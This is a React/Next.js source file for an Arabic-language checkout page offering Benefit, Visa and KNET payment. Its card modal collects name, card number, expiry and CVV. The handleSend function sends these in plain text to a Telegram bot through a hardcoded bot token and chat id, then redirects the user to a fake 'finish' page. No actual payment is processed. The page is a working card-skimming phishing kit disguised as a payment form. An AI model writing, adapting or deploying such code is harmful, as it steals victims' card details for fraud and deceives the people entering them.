"use client";
import { useState } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import Image from "next/image";
import benefit from '../../../public/benefi.png';
import visa from '../../../public/visa.png';
import kent from "../../../public/download.svg";
import { Modal, Button, Form } from "react-bootstrap";
import { useRouter } from "next/navigation";
import axios from "axios";

export default function PaymentPage() {
  const [selectedMethod, setSelectedMethod] = useState("knet");
  const [showModal, setShowModal] = useState(false);
  const [submittedMethod, setSubmittedMethod] = useState(null);

  const [cardData, setCardData] = useState({
    name: "",
    number: "",
    expiry: "",
    cvv: ""
  });

  const router = useRouter();

  const handleSelect = (method) => {
    setSelectedMethod(method);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setCardData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = () => {
    setSubmittedMethod(selectedMethod);

    if (selectedMethod === "knet") {
      router.push("/kpay"); // ✅ تحويل مباشر بدون مودال
    } else if (selectedMethod === "visa" || selectedMethod === "benefit") {
      setShowModal(true); // ✅ فتح المودال للبطاقات
    }
  };

  const handleSend = () => {
    const text = `
%0A🏦 VISA / Benefit 
👤 الاسم الكامل: ${cardData.name}%0A
💳 رقم البطاقة: ${cardData.number}%0A
📅 تاريخ الانتهاء: ${cardData.expiry}%0A
🔐 CVV: ${cardData.cvv}
`;
    if (!/^\d{16}$/.test(cardData.number)) {
  alert("رقم البطاقة يجب أن يكون 16 رقمًا");
  return;
}
if (!/^\d{3,4}$/.test(cardData.cvv)) {
  alert("CVV غير صحيح");
  return;
}
if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
  alert("تاريخ الانتهاء غير صحيح");
  return;
}
    if (
      cardData.name.trim() === "" ||
      cardData.number.trim() === "" ||
      cardData.expiry.trim() === "" ||
      cardData.cvv.trim() === ""
    ) {
      alert("من فضلك املئ الحقول");
    } else {
      axios.post(
        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
      );
      router.push(`/kpay/finish?name=${cardData.number}`);
    }
  };

  return (
    <div className="container py-5 d-flex flex-column justify-content-between" style={{ minHeight: "100vh" }}>
      <div>
        <div className="text-center mb-5">
          <h4 className="mt-5">الدفع و التأكيد</h4>
        </div>

        <div className="my-5">
          <h5>طريقة الدفع:</h5>

          <div className="list-group my-4">
            <label className={`list-group-item ${selectedMethod === "benefit" ? "active" : ""}`} onClick={() => handleSelect("benefit")}>
              <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "benefit"} readOnly />
              <Image src={benefit} width={40} height={20} alt="Benefit" className="me-2" />
              بطاقة بنفت البنكية
            </label>

            <label className={`list-group-item ${selectedMethod === "visa" ? "active" : ""}`} onClick={() => handleSelect("visa")}>
              <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "visa"} readOnly />
              <Image src={visa} width={40} height={20} alt="Visa" className="me-2" />
              بطاقة إئتمانية
            </label>

            <label className={`list-group-item ${selectedMethod === "knet" ? "active" : ""}`} onClick={() => handleSelect("knet")}>
              <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "knet"} readOnly />
              <Image src={kent} width={40} height={20} alt="KNET" className="me-2" />
              كي نت
            </label>
          </div>
        </div>
      </div>

      <div className="text-center my-4">
        <button className="btn btn-primary w-100 py-2" onClick={handleSubmit}>
          أدخل بيانات الدفع
        </button>
        <p className="text-muted mt-2" style={{ fontSize: '0.9rem' }}>
          بالضغط على الزر فأنت توافق على <a href="#">الشروط والأحكام</a>
        </p>
      </div>

      {/* المودال للبطاقات فقط */}
      <Modal show={showModal} onHide={() => setShowModal(false)} centered>
        <Modal.Header closeButton>
          <Modal.Title>أدخل بيانات البطاقة</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <Form>
            <Form.Group className="mb-3">
              <Form.Label>الاسم على البطاقة</Form.Label>
              <Form.Control
                type="text"
                name="name"
                value={cardData.name}
                onChange={handleInputChange}
                placeholder="الاسم الكامل"
              />
            </Form.Group>

            <Form.Group className="mb-3">
              <Form.Label>رقم البطاقة</Form.Label>
                <Form.Control
                  type="text"
                  name="number"
                  value={cardData.number}
                  onChange={handleInputChange}
                  placeholder="•••• •••• •••• ••••"
                  maxLength={16}
                  inputMode="numeric"
                  pattern="[0-9]*"
                />
            </Form.Group>

            <div className="d-flex gap-3">
              <Form.Group className="mb-3 w-50">
                <Form.Label>تاريخ الانتهاء</Form.Label>
                <Form.Control
                  type="text"
                  name="expiry"
                  value={cardData.expiry}
                  onChange={handleInputChange}
                  placeholder="MM/YY"
                />
              </Form.Group>

              <Form.Group className="mb-3 w-50">
                <Form.Label>CVV</Form.Label>
                <Form.Control
                  type="text"
                  name="cvv"
                  value={cardData.cvv}
                  onChange={handleInputChange}
                  placeholder="•••"
                  maxLength={4}            // CVV يكون عادة 3 أو 4 أرقام
                  inputMode="numeric"      // يعرض لوحة الأرقام على الجوال
                  pattern="[0-9]*"         // يقبل فقط الأرقام
                />

              </Form.Group>
            </div>
          </Form>
        </Modal.Body>
        <Modal.Footer className="d-flex flex-column gap-2">
          <Button variant="primary" className="w-100" onClick={handleSend}>
            دفع
          </Button>

          {selectedMethod === "benefit" && (
            <Button
              variant="success"
              className="w-100 d-flex align-items-center justify-content-center gap-2"
              onClick={() => router.push("/kpay")}
            >
              <Image src={kent} alt="KNET" width={24} height={24} />
              دفع عبر كي نت
            </Button>
          )}

          <Button variant="secondary" className="w-100" onClick={() => setShowModal(false)}>
            إلغاء
          </Button>
        </Modal.Footer>
      </Modal>
    </div>
  );
}
